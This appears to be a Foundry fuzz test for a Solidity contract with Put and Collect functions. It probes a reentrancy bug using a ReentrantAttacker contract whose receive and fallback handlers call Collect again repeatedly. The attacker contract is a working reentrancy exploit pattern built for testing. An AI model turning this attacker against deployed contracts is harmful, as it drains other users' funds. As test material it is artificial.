pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    function setUp() public { c = new C(address(this)); }
    function testFuzz_property(uint256 amount, uint8 reentrancyDepth) public {
        // Restrict to admissible domain: deposit at least 1 ether to meet MinSum, plus some extra for reentrant attacks
        vm.assume(amount >= 1 ether && amount <= 100 ether);
        vm.assume(reentrancyDepth >= 2 && reentrancyDepth <= 10);

        // Deploy a reentrant attacker that calls Collect again within its fallback
        ReentrantAttacker attacker = new ReentrantAttacker(c, amount, reentrancyDepth);
        vm.deal(address(attacker), amount);

        // Attacker deposits enough to meet MinSum
        attacker.deposit{value: amount}();

        // Warp past unlock time (0) to allow Collect
        vm.warp(block.timestamp + 1);

        // Record balance before Collect
        (, uint256 balBefore) = c.Acc(address(attacker));

        // Perform the initial Collect call
        uint256 collected = amount / reentrancyDepth;
        attacker.attack(collected);

        // Record balance after Collect
        (, uint256 balAfter) = c.Acc(address(attacker));

        // The property: the final balance must equal initial balance minus the amount collected in the first call
        // (because each internal Collect should update the balance, but the bug skips updates for reentrant calls)
        assertTrue(balAfter == balBefore - collected);
    }
}

contract ReentrantAttacker {
    C public target;
    uint256 public depositAmount;
    uint256 public depth;
    uint256 public collectedPerCall;
    uint256 public callsMade;

    constructor(C _target, uint256 _depositAmount, uint256 _depth) {
        target = _target;
        depositAmount = _depositAmount;
        depth = _depth;
        collectedPerCall = _depositAmount / _depth;
    }

    function deposit() external payable {
        target.Put{value: msg.value}(0);
    }

    function attack(uint256 _am) external {
        callsMade = 0;
        target.Collect(_am);
    }

    fallback() external payable {
        callsMade++;
        if (callsMade < depth) {
            target.Collect(collectedPerCall);
        }
    }

    receive() external payable {
        callsMade++;
        if (callsMade < depth) {
            target.Collect(collectedPerCall);
        }
    }
}
